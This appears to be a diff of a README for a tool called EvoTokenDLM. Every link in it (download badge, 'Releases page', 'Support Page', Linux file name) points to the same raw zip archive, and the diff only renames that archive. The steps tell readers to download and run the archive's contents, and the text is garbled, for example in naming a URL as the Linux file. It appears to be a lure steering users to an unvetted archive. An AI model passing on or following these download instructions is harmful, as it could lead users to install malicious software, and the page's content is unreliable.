@@ -10,19 +10,19 @@ Welcome to EvoTokenDLM! This application helps you explore advanced token evolut
 - **Internet Connection:** Required for downloading the application and updates.
 
 ## 💾 Download Now
-[![Download EvoTokenDLM](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip%20EvoTokenDLM-v1.0-blue)](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip)
+[![Download EvoTokenDLM](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip%20EvoTokenDLM-v1.0-blue)](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip)
 
-To get started, visit the Releases page to download the latest version of EvoTokenDLM: [EvoTokenDLM Releases](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip).
+To get started, visit the Releases page to download the latest version of EvoTokenDLM: [EvoTokenDLM Releases](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip).
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
-   Go to the following link to access the Releases page: [EvoTokenDLM Releases](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip).
+   Go to the following link to access the Releases page: [EvoTokenDLM Releases](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip).
 
 2. **Choose the Right File**
    On the Releases page, you will see several options. Pick the file that matches your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip` file.
 
 3. **Download the File**
    Click the file to start the download. Depending on your internet speed, this may take a few moments.
@@ -39,7 +39,7 @@ To get started, visit the Releases page to download the latest version of EvoTok
      - Drag the EvoTokenDLM icon into your Applications folder.
 
    - **Linux:**
-     - Extract the `https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip` file using your archive manager or via terminal.
+     - Extract the `https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip` file using your archive manager or via terminal.
      - Navigate to the extracted folder.
      - Run the application using the terminal by typing `./EvoTokenDLM`.
 
@@ -67,7 +67,7 @@ To get started, visit the Releases page to download the latest version of EvoTok
    - Use the "Save" function from the file menu.
 
 ## 💬 Support
-If you have questions or need help, check the embedded help section in the app or visit our [Support Page](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip). Community members and developers are available to assist you.
+If you have questions or need help, check the embedded help section in the app or visit our [Support Page](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip). Community members and developers are available to assist you.
 
 ## 📈 Contributing
 We welcome contributions! If you want to improve EvoTokenDLM, feel free to fork the repository and submit a pull request. Collaboration is key to making this tool better for everyone.
@@ -81,4 +81,4 @@ Stay up to date with the latest changes and features by checking the release not
 
 Download the latest version and start your journey with EvoTokenDLM today!
 
-[![Download EvoTokenDLM](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip%20EvoTokenDLM-v1.0-blue)](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_v2.7.zip)
+[![Download EvoTokenDLM](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip%20EvoTokenDLM-v1.0-blue)](https://raw.githubusercontent.com/FAISALODAY/EvoTokenDLM/master/assets/DLM_Evo_Token_1.0.zip)
